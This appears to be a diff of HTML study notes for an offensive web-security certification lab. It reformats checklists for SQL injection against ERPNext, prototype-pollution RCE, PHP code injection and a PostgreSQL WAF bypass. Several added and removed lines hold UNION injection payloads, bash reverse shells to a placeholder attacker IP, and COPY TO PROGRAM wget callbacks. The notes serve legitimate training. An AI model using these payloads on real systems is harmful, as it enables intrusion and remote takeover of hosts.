@@ -3400,11 +3400,18 @@ SELECT `doctype`, `name`, `content`, `title`, `route`
 <pre><code class="language-json">// Response confirms injection - numbers map to column positions
 {"message":[{"route":"5","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}</code></pre>
 
-<ul class="methodology-checklist">
-  <li><label><input type="checkbox"> Extract database version</label></li>
-  <li><label><input type="checkbox"> scope payload: [scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</label></li>
-  <li><label><input type="checkbox"> Response: "route":"10.2.24-MariaDB-10.2.24+maria~xenial-log"</label></li>
-</ul>
+<p>To confirm data extraction, submit the version payload and verify that the database version appears in the response route field.</p>
+
+<table class="custom-table">
+<thead><tr><th>Purpose</th><th>Payload</th><th>Expected Indicator</th></tr></thead>
+<tbody>
+<tr>
+  <td>Extract database version</td>
+  <td><code>[scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code></td>
+  <td><code>"route":"10.2.24-MariaDB-10.2.24+maria~xenial-log"</code></td>
+</tr>
+</tbody>
+</table>
 
 <h4 id="oswe-erpnext-collation">7.4.2 Resolving Collation Errors</h4>
 <p>Extracting string data from other tables triggers a "Illegal mix of collations for operation 'UNION'" error because the <code>__global_search</code> table uses a different collation than the target table. Extract the collation via <code>information_schema</code> and force it with <code>COLLATE</code>.</p>
@@ -3516,14 +3523,10 @@ def reset_password(self, send_email=False, password_expired=False):
     <label><input type="checkbox"> Map response column positions: doctype=1, name=2, content=3, title=4, route=5</label>
   </li>
   <li>
-    <label><input type="checkbox"> Extract database version to confirm injection</label>
-    <pre><code class="language-sql">-- scope payload:
--- [scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code></pre>
+    <label><input type="checkbox"> Extract database version with <code>[scope-prefix]" UNION ALL SELECT 1,2,3,4,@@version#</code> to confirm injection</label>
   </li>
   <li>
-    <label><input type="checkbox"> Resolve collation mismatch when extracting from other tables</label>
-    <pre><code class="language-sql">-- Extract collation:
--- [scope-prefix]" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#</code></pre>
+    <label><input type="checkbox"> Resolve collation mismatch by extracting <code>COLLATION_NAME</code> from <code>information_schema.columns</code></label>
   </li>
   <li>
     <label><input type="checkbox"> Extract usernames from <code>__Auth</code> table with forced collation</label>
@@ -6764,9 +6767,8 @@ docker-compose logs chips | grep "esc is not a function"</code></pre></li>
 <li><label><input type="checkbox"> Pollute <code>outputFunctionName</code> with a JavaScript payload that completes the <code>var</code> declaration on both sides</label></li>
 <li><label><input type="checkbox"> Verify code execution via <code>whoami</code> output in docker logs</label>
 <pre><code class="language-bash">docker-compose logs --tail=20 chips</code></pre></li>
-<li><label><input type="checkbox"> Replace the detection payload with a reverse shell and start a listener</label>
-<pre><code class="language-bash">nc -lvnp 9000
-# Payload: "x=1;process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/[attacker-ip]/9000 0>&1\"');y"</code></pre></li>
+<li><label><input type="checkbox"> Replace the detection payload with a reverse shell payload and start a listener with <code>nc -lvnp [listener-port]</code></label>
+<p>Use <code>"x=1;process.mainModule.require('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1\"');y"</code> as the polluted <code>outputFunctionName</code> value.</p></li>
 <li><label><input type="checkbox"> Trigger the full chain: POST <code>/tokens</code>, connect to <code>/guaclite</code>, load any page</label></li>
 </ul>
 
@@ -7478,10 +7480,7 @@ www-data</code></pre>
   <li><label><input type="checkbox" data-id="oswe-13-6"> Test alternative bypass techniques: ReflectionFunction, str_rot13, str_replace, strip_tags</label></li>
   <li><label><input type="checkbox" data-id="oswe-13-7"> Inject payload via admin Computed Field feature at <code>/user/admin/user_extrafields.php</code></label></li>
   <li><label><input type="checkbox" data-id="oswe-13-8"> Navigate to Users list to trigger <code>showOutputField()</code> and verify RCE</label></li>
-  <li><label><input type="checkbox" data-id="oswe-13-9"> Upgrade to reverse shell via bash TCP redirect</label>
-    <pre><code class="language-bash">nc -nvlp [listener-port]
-# Payload: /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'</code></pre>
-  </li>
+  <li><label><input type="checkbox" data-id="oswe-13-9"> Upgrade to a reverse shell with <code>nc -nvlp [listener-port]</code> and the payload <code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[listener-port] 0&gt;&amp;1'</code></label></li>
 </ul>
 
 
@@ -7801,14 +7800,16 @@ curl -s -X POST "http://[target-ip]:80/v1/warehouse/pending-events?triggerUpload
 <h4 id="oswe-rudderstack-waf-rule-analysis">14.6.4 WAF Rule Analysis</h4>
 <p>The Caddy logs reveal that rule 942540 ("SQL Authentication bypass - split query") from <code>REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code> triggered the block. The rule uses an anomaly scoring model: matching a critical-severity rule adds 5 points to the inbound anomaly score, which exceeds the threshold and triggers a block via rule 949110.</p>
 
-<ul class="methodology-checklist">
-  <li><label><input type="checkbox"> WAF log entry showing triggered rule</label></li>
-  <li><label><input type="checkbox"> Rule ID: 942540</label></li>
-  <li><label><input type="checkbox"> Message: "SQL Authentication bypass (split query)"</label></li>
-  <li><label><input type="checkbox"> File: <code>REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></label></li>
-  <li><label><input type="checkbox"> Severity: CRITICAL</label></li>
-  <li><label><input type="checkbox"> Matched Data: "'; found within ARGS:json.source_id"</label></li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Log Field</th><th>Value</th></tr></thead>
+<tbody>
+<tr><td>Rule ID</td><td><code>942540</code></td></tr>
+<tr><td>Message</td><td><code>SQL Authentication bypass (split query)</code></td></tr>
+<tr><td>Rule File</td><td><code>REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></td></tr>
+<tr><td>Severity</td><td><code>CRITICAL</code></td></tr>
+<tr><td>Matched Data</td><td><code>'; found within ARGS:json.source_id</code></td></tr>
+</tbody>
+</table>
 
 <pre><code class="language-bash"># SecRule definition for rule 942540
 SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
@@ -7890,16 +7891,12 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
   -H "Content-Type: application/json" \
   -d '{"source_id":"1; select 2 FROM wh_uploads; -- -","task_run_id":"1"}'</code></pre>
   </li>
-  <li><label><input type="checkbox" data-id="oswe-14-7"> Achieve RCE via PostgreSQL <code>COPY TO PROGRAM</code></label>
-    <pre><code class="language-sql">'; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/test' -- -</code></pre>
-  </li>
+  <li><label><input type="checkbox" data-id="oswe-14-7"> Achieve RCE via PostgreSQL <code>COPY TO PROGRAM</code> using the callback payload from section 14.5</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-8"> If WAF blocks payload, check WAF logs to identify the triggering rule</label>
     <pre><code class="language-bash">docker logs -n 20 student_caddy_1</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-14-9"> Analyze the WAF rule regex and test bypass payloads on regex101</label></li>
-  <li><label><input type="checkbox" data-id="oswe-14-10"> Modify payload to evade WAF: separate quote from semicolon with valid SQL</label>
-    <pre><code class="language-sql">' or 1=2; copy (select 'a') to program 'wget -q http://[attacker-ip]:[http-port]/bypass' -- -</code></pre>
-  </li>
+  <li><label><input type="checkbox" data-id="oswe-14-10"> Modify the payload to evade the WAF by separating the quote from the semicolon with a valid SQL expression</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-11"> Verify callback on attacker HTTP server to confirm WAF bypass and RCE</label></li>
 </ul>
 
